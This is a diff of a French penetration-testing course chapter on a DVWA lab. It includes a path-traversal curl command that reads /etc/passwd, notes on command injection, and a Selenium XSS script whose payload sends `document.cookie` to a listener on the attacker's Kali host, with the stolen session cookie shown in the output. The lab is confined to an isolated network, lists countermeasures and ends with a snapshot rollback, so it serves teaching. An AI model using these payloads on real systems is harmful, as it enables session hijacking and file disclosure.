-**Piège courant** — si le formulaire échappe `;`, essayez `|` ou `&&` uniquement si le niveau est `low` et si le lab l'autorise ; ici, `;` fonctionne. Ne lancez pas de commande destructive (`rm`, `shutdown`, modification de fichier) : la preuve est `id`, `hostname`, `uname`.
+Apache/PHP tourne sous `www-data`. L'injection de commande donne les droits du processus web, pas ceux de root. Une élévation locale serait une autre étape, hors périmètre.
 
 **Preuve** — `07-cmdi.txt` avec `# rc=0`.
 
-### 13.11 Étape 7 — Inclusion de fichier local
+#### Étape 9 — Inclusion de fichier local
 
 **But** — prouver qu'un paramètre de page permet de lire un fichier hors du répertoire prévu.
 
@@ -3716,35 +5298,37 @@ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
+**Exemple de commande**
+
 ```bash
-curl -sS -b cookies.txt -G \
-  --data-urlencode 'page=../../../../../etc/passwd' \
-  'http://192.168.56.103/dvwa/vulnerabilities/fi/'
+prouve 08-lfi.txt bash -c "curl -sS -b cookies.txt -G --data-urlencode 'page=../../../../../etc/passwd' 'http://192.168.56.103/dvwa/vulnerabilities/fi/' | grep -E 'root:|msfadmin:' | head -2"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve 08-lfi.txt` : enregistre la requête et son code retour.
+- `curl -sS -b cookies.txt` : utilise la session authentifiée.
+- `-G` : place le paramètre en query string.
+- `--data-urlencode 'page=../../../../../etc/passwd'` : encode le chemin de traversée.
+- `page=` : paramètre d'inclusion ; DVWA inclut le fichier indiqué.
+- `../../../../../` : remonte les répertoires pour quitter le répertoire du lab.
+- `/etc/passwd` : fichier lisible, preuve non destructive.
+- `grep -E 'root:|msfadmin:'` : extrait les comptes significatifs.
+- `head -2` : limite l'affichage à deux lignes.
+- Piège courant : certains serveurs interdisent `..` ou utilisent `open_basedir`. Ici, le niveau `low` les autorise. La mitigation est une allowlist de fichiers et la désactivation des wrappers PHP dangereux.
+
+**Résultat attendu**
 
 ```text
 root:x:0:0:root:/root:/bin/bash
 msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
 ```
 
-**Explication de la commande** :
-
-| Élément | Rôle | Pourquoi |
-|---|---|---|
-| `page=` | paramètre d'inclusion | DVWA inclut le fichier indiqué |
-| `../../../../../` | remontée de répertoires | quitte le répertoire du lab |
-| `/etc/passwd` | fichier lisible | preuve non destructive |
-| `--data-urlencode` | encode les `/` et `..` | conserve le chemin dans la query string |
-
-**Pourquoi cinq `../`** — le script DVWA est dans un sous-répertoire profond ; cinq remontées atteignent la racine. Le nombre exact dépend de la configuration. Si cinq ne suffisent pas, testez six ou sept, mais documentez le chemin qui fonctionne ; ne concluez pas à une absence de LFI sur un seul essai.
-
-**Piège courant** — certains serveurs interdisent `..` ou utilisent `open_basedir`. Ici, le niveau `low` les autorise. La mitigation est une allowlist de fichiers et la désactivation des wrappers PHP dangereux.
+Le script DVWA est dans un sous-répertoire profond ; cinq remontées atteignent la racine. Le nombre exact dépend de la configuration. Si cinq ne suffisent pas, testez six ou sept, mais documentez le chemin qui fonctionne ; ne concluez pas à une absence de LFI sur un seul essai.
 
 **Preuve** — `08-lfi.txt` avec `# rc=0`.
 
-### 13.12 Étape 8 — XSS réel dans Chromium et exfiltration du cookie
+#### Étape 10 — XSS réel dans Chromium et exfiltration du cookie
 
 **But** — prouver l'exécution JavaScript et l'exfiltration du cookie de session dans un navigateur réel, pour le XSS réfléchi et le XSS stocké.
 
@@ -3754,11 +5338,32 @@ msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
+**Exemple de commande**
+
 ```bash
 prouve 12-xss-browser.txt timeout 120 python3 xss-browser-test.py
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve 12-xss-browser.txt` : enregistre la sortie du test navigateur et son code retour.
+- `timeout 120` : borne l'exécution à 120 secondes.
+- `python3 xss-browser-test.py` : lance le script Selenium.
+- `HTTPServer(("0.0.0.0", 8000), Handler)` : listener de callback qui reçoit les requêtes déclenchées par le JavaScript.
+- `do_GET` et `requests_seen.append` : journalisent le chemin contenant le cookie.
+- `webdriver.Chrome(... /usr/bin/chromedriver)` : navigateur réel qui exécute JavaScript comme une victime.
+- `--headless=new` : mode sans fenêtre, reproductible sur Kali sans écran.
+- `driver.get(login.php)` et `send_keys` : login et obtention du cookie de session.
+- `Select(...).select_by_value("low")` : force le niveau DVWA.
+- `urllib.parse.quote(reflected, safe="")` : encode le payload `<script>` dans l'URL.
+- `new Image().src='...'+document.cookie` : exfiltre le cookie vers le listener.
+- `execute_script(... mtxMessage ...)` : contourne `maxlength`, car le contrôle client ne doit pas être la seule défense.
+- `dismiss_alerts` : accepte les alertes du guestbook.
+- `print("EXFILTRATED_COOKIE:")` : affiche le cookie complet reçu.
+- `driver.quit()` et `server.shutdown()` : arrêtent le navigateur et le listener.
+- Piège courant : si `CALLBACK_REQUESTS` vaut `0`, vérifiez que le listener écoute sur `0.0.0.0:8000`, que Kali peut joindre `192.168.56.101:8000` depuis le navigateur et que le payload n'est pas filtré.
+
+**Résultat attendu**
 
 ```text
 LOGIN_URL: http://192.168.56.103/dvwa/index.php
@@ -3773,31 +5378,96 @@ EXFILTRATED_COOKIE: security=low; PHPSESSID=155b8a11893786acc1c06cb64f65343c
 # rc=0
 ```
 
-**Explication du script** :
+`curl` ne fait qu'afficher le HTML. Chromium exécute le script, construit une requête vers `192.168.56.101:8000` et transmet `document.cookie`. La ligne `EXFILTRATED_COOKIE` prouve l'exécution et la lecture du cookie. Le cookie est un cookie de lab ; il est invalidé par la restauration du snapshot et ne doit pas être réutilisé. Si Chromium ne démarre pas, vérifiez `chromedriver --version` et la variable `PATH`. Si une alerte bloque la page, `dismiss_alerts` doit l'accepter ; sinon, le script peut expirer.
 
-| Élément | Rôle | Pourquoi |
-|---|---|---|
-| `HTTPServer(("0.0.0.0", 8000), Handler)` | listener de callback | reçoit les requêtes déclenchées par le JavaScript |
-| `do_GET` + `requests_seen.append` | journalisation | conserve le chemin contenant le cookie |
-| `webdriver.Chrome(... /usr/bin/chromedriver)` | navigateur réel | exécute JavaScript comme une victime |
-| `--headless=new` | mode sans fenêtre | reproductible sur Kali sans écran |
-| `driver.get(login.php)` + `send_keys` | login | obtient un cookie de session |
-| `Select(...).select_by_value("low")` | niveau DVWA | active le XSS |
-| `urllib.parse.quote(reflected, safe="")` | encodage URL | transporte le payload `<script>` |
-| `new Image().src='...'+document.cookie` | exfiltration | le navigateur envoie le cookie au listener |
-| `execute_script(... mtxMessage ...)` | bypass `maxlength` | le contrôle client ne doit pas être la seule défense |
-| `dismiss_alerts` | gestion des alertes | le guestbook contient aussi un `alert(1)` de test |
-| `print("EXFILTRATED_COOKIE:")` | preuve lisible | montre le cookie complet reçu |
+**Preuve** — `12-xss-browser.txt`. `00-suite.txt` exécute `web-tests.sh` puis le test navigateur et contient les sorties des deux.
 
-**Pourquoi cette preuve est plus forte que `curl`** — `curl` ne fait qu'afficher le HTML. Chromium exécute le script, construit une requête vers `192.168.56.101:8000` et transmet `document.cookie`. La ligne `EXFILTRATED_COOKIE` prouve l'exécution et la lecture du cookie. Le cookie est un cookie de lab ; il est invalidé par la restauration du snapshot et ne doit pas être réutilisé.
+#### Étape 11 — Archiver les preuves sur l'hôte
 
-**Piège courant** — si `CALLBACK_REQUESTS` vaut `0`, vérifiez que le listener écoute sur `0.0.0.0:8000`, que Kali peut joindre `192.168.56.101:8000` depuis le navigateur, et que le payload n'est pas filtré. Si Chromium ne démarre pas, vérifiez `chromedriver --version` et la variable `PATH`. Si une alerte bloque la page, `dismiss_alerts` doit l'accepter ; sinon, le script peut expirer.
+**But** — copier les preuves de Kali vers l'hôte et vérifier leur intégrité par empreinte SHA-256.
 
-**Preuve de suite** — `00-suite.txt` exécute `web-tests.sh` puis le test navigateur et contient les sorties des deux. La preuve `12-xss-browser.txt` isole le test navigateur.
+**Machine** — hôte (hyperviseur).
 
-### 13.13 Résultats, archivage et rollback
+**Prérequis** — preuves des étapes 1 à 10 présentes sur Kali ; accès SSH à Kali.
 
-Le tableau de résultats est le suivant. La colonne `Preuve` renvoie aux fichiers de `preuves/ch1-lab8-v3/`.
+> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : votre compte | **Répertoire** : racine du projet `hacking-contre-mesure-niveau-2`
+
+**Exemple de commande**
+
+```bash
+mkdir -p preuves/ch1-lab8-v3
+scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab8-v3/. preuves/ch1-lab8-v3/
+find preuves/ch1-lab8-v3 -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > preuves/ch1-lab8-v3/SHA256SUMS
+sha256sum -c preuves/ch1-lab8-v3/SHA256SUMS
+```
+
+**Explication de la commande**
+
+- `mkdir -p preuves/ch1-lab8-v3` : crée le répertoire d'archivage.
+- `scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab8-v3/. preuves/ch1-lab8-v3/` : copie récursivement le contenu distant.
+- `find preuves/ch1-lab8-v3 -type f` : liste les fichiers réguliers.
+- `! -name SHA256SUMS` : exclut le fichier de sommes.
+- `-print0` et `sort -z` : traitent les noms sans ambiguïté.
+- `xargs -0 sha256sum` : calcule les empreintes.
+- `> preuves/ch1-lab8-v3/SHA256SUMS` : enregistre les sommes.
+- `sha256sum -c` : vérifie chaque fichier ; `OK` signifie que l'empreinte correspond.
+- Piège courant : modifier une preuve après le calcul des empreintes ; l'archive n'est plus vérifiable.
+
+**Résultat attendu**
+
+Une suite de `OK` pour chaque fichier. Le fichier `preuves/ch1-lab8-v3/resultats-web.csv` doit contenir les huit lignes de résultats, dont la ligne force brute `N/A`.
+
+**Preuve** — `preuves/ch1-lab8-v3/SHA256SUMS` et `preuves/ch1-lab8-v3/resultats-web.csv`.
+
+#### Étape 12 — Revenir à l'état de référence
+
+**But** — restaurer le snapshot `avant-exploitation` et vérifier que DVWA répond après le rollback.
+
+**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.
+
+**Prérequis** — snapshot `avant-exploitation` restauré depuis l'interface VirtualBox de l'hôte.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve post-rollback-lab8.txt bash -c 'curl -s -o /dev/null -w "DVWA HTTP %{http_code}\n" http://192.168.56.103/dvwa/login.php; ping -c 2 192.168.56.103'
+```
+
+**Explication de la commande**
+
+- `prouve post-rollback-lab8.txt` : enregistre le contrôle de retour à l'état de référence.
+- `bash -c '...'` : exécute la séquence dans un shell enfant.
+- `curl -s -o /dev/null -w "DVWA HTTP %{http_code}\n"` : interroge DVWA et imprime le code HTTP.
+- `ping -c 2 192.168.56.103` : confirme que la cible répond après le rollback.
+- Piège courant : lancer `VBoxManage` depuis Kali ; la gestion des VM est réservée à l'hôte.
+
+**Résultat attendu**
+
+```text
+DVWA HTTP 200
+PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
+64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=0.347 ms
+64 bytes from 192.168.56.103: icmp_seq=2 ttl=64 time=0.375 ms
+
+--- 192.168.56.103 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1012ms
+rtt min/avg/max/mdev = 0.347/0.361/0.375/0.014 ms
+# rc=0
+```
+
+Le guestbook XSS est supprimé par la restauration ; les preuves restent sur l'hôte.
+
+**Preuve** — `preuves/ch1-lab8-v3/post-rollback-lab8.txt`.
+
+### En conclusion
+
+Ce lab a démontré cinq vulnérabilités applicatives DVWA et deux exfiltrations : lecture de la table `users` par SQLi manuelle et SQLmap, exécution JavaScript par XSS réfléchi et stocké, injection de commande avec `uid=33(www-data)`, lecture de `/etc/passwd` par LFI, et exfiltration du cookie `PHPSESSID` vers Kali `8000/tcp` dans Chromium. La preuve navigateur distingue l'exécution réelle d'une simple réflexion HTML.
+
+Dans la chaîne d'exploitation, ce lab se situe après l'énumération web (Lab-05) et la qualification des CVE (Lab-06). Il montre le passage de la découverte à l'**accès aux données** et à l'**exfiltration**, tout en restant sur le niveau `low` de DVWA. Le rollback supprime le guestbook XSS et les sessions ; les preuves restent sur l'hôte. La contre-mesure est explicite : requêtes préparées, encodage de sortie, CSP, cookies `HttpOnly`/`Secure`, allowlist de fichiers et moindre privilège.
+
+**Tableau de résultats**
 
 | Vulnérabilité | Vecteur | Statut | Preuve | Résultat |
 |---|---|---|---|---|
@@ -3824,42 +5494,7 @@ cible,application,vulnerabilite,vecteur,commande,statut,preuve,resultat,limite
 192.168.56.103,DVWA,Force brute,POST login,non exécuté,N/A,-,Exclu par les règles du lab,Interdit: force brute
 ```
 
-**Archivage sur l'hôte** :
-
-> **Machine** : hôte (hyperviseur) | **Terminal** : terminal local | **Utilisateur** : votre compte | **Répertoire** : racine du projet `hacking-contre-mesure-niveau-2`
-
-```bash
-mkdir -p preuves/ch1-lab8-v3
-scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab8-v3/. preuves/ch1-lab8-v3/
-find preuves/ch1-lab8-v3 -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > preuves/ch1-lab8-v3/SHA256SUMS
-sha256sum -c preuves/ch1-lab8-v3/SHA256SUMS
-```
-
-**Rollback** — restaurez le snapshot `avant-exploitation` de Metasploitable 2 depuis l'interface VirtualBox ou demandez au sysadmin. Vérifiez ensuite que DVWA répond et que les services du Lab-07 sont revenus :
-
-> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
-
-```bash
-prouve post-rollback-lab8.txt bash -c 'curl -s -o /dev/null -w "DVWA HTTP %{http_code}\n" http://192.168.56.103/dvwa/login.php; ping -c 2 192.168.56.103'
-```
-
-Résultat attendu (extrait réel) :
-
-```text
-DVWA HTTP 200
-PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
-64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=0.347 ms
-64 bytes from 192.168.56.103: icmp_seq=2 ttl=64 time=0.375 ms
-
---- 192.168.56.103 ping statistics ---
-2 packets transmitted, 2 received, 0% packet loss, time 1012ms
-rtt min/avg/max/mdev = 0.347/0.361/0.375/0.014 ms
-# rc=0
-```
-
-Le guestbook XSS est supprimé par la restauration ; les preuves restent sur l'hôte.
-
-### 13.14 Critères de réussite
+**Critères de réussite**
 
 - [ ] `00-prerequis.txt` montre `HTTP 200` et les outils disponibles.
 - [ ] `01-login.txt` et `02-security-low.txt` montrent une session et `security=low`.
@@ -3873,12 +5508,6 @@ Le guestbook XSS est supprimé par la restauration ; les preuves restent sur l'h
 - [ ] Les preuves sont copiées sur l'hôte et `sha256sum -c` retourne `OK`.
 - [ ] Le snapshot `avant-exploitation` est restauré ; DVWA répond ; le guestbook est propre.
 - [ ] Aucune force brute, aucun déni de service, aucune persistance, aucune cible hors `192.168.56.0/24`.
-
-### 13.15 Conclusion
-
-Ce lab a démontré cinq vulnérabilités applicatives DVWA et deux exfiltrations : lecture de la table `users` par SQLi manuelle et SQLmap, exécution JavaScript par XSS réfléchi et stocké, injection de commande avec `uid=33(www-data)`, lecture de `/etc/passwd` par LFI, et exfiltration du cookie `PHPSESSID` vers Kali `8000/tcp` dans Chromium. La preuve navigateur distingue l'exécution réelle d'une simple réflexion HTML.
-
-Dans la chaîne d'exploitation, ce lab se situe après l'énumération web (Lab-05) et la qualification des CVE (Lab-06). Il montre le passage de la découverte à l'**accès aux données** et à l'**exfiltration**, tout en restant sur le niveau `low` de DVWA. Le rollback supprime le guestbook XSS et les sessions ; les preuves restent sur l'hôte. La contre-mesure est explicite : requêtes préparées, encodage de sortie, CSP, cookies `HttpOnly`/`Secure`, allowlist de fichiers et moindre privilège.
 
 ## 14. Synthèse et transition
 
@@ -3912,7 +5541,7 @@ Dans la chaîne d'exploitation, ce lab se situe après l'énumération web (Lab-
 | Lab-07 | `exploitation/msf-*.txt`, `cve-CVE-*.txt`, `resultats-cve-v3.csv` | 4 preuves `# rc=0` ; 12 CVE qualifiées ; rollback |
 | Lab-08 | `00-suite.txt`, `01-login.txt` à `12-xss-browser.txt`, `resultats-web.csv` | 8 PASS ; cookie exfiltré ; rollback |
 
-Les jeux de preuves de référence sont archivés dans `preuves/ch1-lab1-v2`, `preuves/ch1-lab2-v2`, `preuves/ch1-lab3-v2`, `preuves/ch1-lab4-v2`, `preuves/ch1-lab5-v2`, `preuves/ch1-lab6`, `preuves/ch1-lab7` et `preuves/ch1-lab8-v3`. Les répertoires `-hacker` et `ch1-lab6-v2` sont des essais ou des versions antérieures, pas des références. Si vous ajoutez des preuves, mettez à jour le tableau et les sommes.
+Les jeux de preuves de référence sont archivés dans les répertoires de preuves du chapitre. Les répertoires d'essai, les doublons et les versions antérieures ne sont pas des références. Si vous ajoutez des preuves, mettez à jour le tableau et les sommes.
 
 ### 14.3 Limites du chapitre
 
